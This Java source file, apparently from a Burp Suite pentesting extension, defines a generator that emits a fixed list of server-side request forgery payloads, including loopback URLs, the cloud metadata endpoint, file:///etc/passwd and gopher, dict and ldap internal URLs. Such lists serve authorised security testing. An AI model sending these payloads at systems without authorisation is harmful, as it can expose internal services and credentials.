package com.secure.ai.burp.generators.payload.generators;

import burp.api.montoya.http.HttpRequestToBeSent;
import com.secure.ai.burp.models.ml.ModelManager;
import com.secure.ai.burp.generators.payload.GeneratedPayload;
import com.secure.ai.burp.generators.payload.PayloadContext;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

class SSRFPayloadGenerator implements PayloadGeneratorStrategy {
    private final ModelManager modelManager;
    private final AtomicInteger generatedCount = new AtomicInteger(0);
    
    private static final String[] SSRF_PAYLOADS = {
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://192.168.1.1",
        "gopher://127.0.0.1:8080/_GET",
        "dict://127.0.0.1:22",
        "ldap://127.0.0.1:389"
    };
    
    public SSRFPayloadGenerator(ModelManager modelManager) {
        this.modelManager = modelManager;
    }
    
    @Override
    public List<GeneratedPayload> generatePayloads(HttpRequestToBeSent request, PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String payload : SSRF_PAYLOADS) {
            GeneratedPayload generated = new GeneratedPayload.Builder(payload, "ssrf", context)
                    .generationMethod("basic")
                    .effectivenessScore(0.7)
                    .build();
            payloads.add(generated);
        }
        
        generatedCount.addAndGet(payloads.size());
        return payloads;
    }
    
    @Override
    public GeneratedPayload customizePayload(String basePayload, PayloadContext context) {
        return new GeneratedPayload.Builder(basePayload, "ssrf", context)
                .generationMethod("customized")
                .build();
    }
    
    @Override
    public String getVulnerabilityType() { return "ssrf"; }
    @Override
    public int getGeneratedCount() { return generatedCount.get(); }
    @Override
    public void updateLearning(GeneratedPayload payload, boolean wasSuccessful, double actualEffectiveness) {}
    @Override
    public double getContextualPriority(PayloadContext context) { return context.hasUrlParameters() ? 0.8 : 0.3; }
    @Override
    public boolean isApplicable(PayloadContext context) { return context.hasUrlParameters(); }
}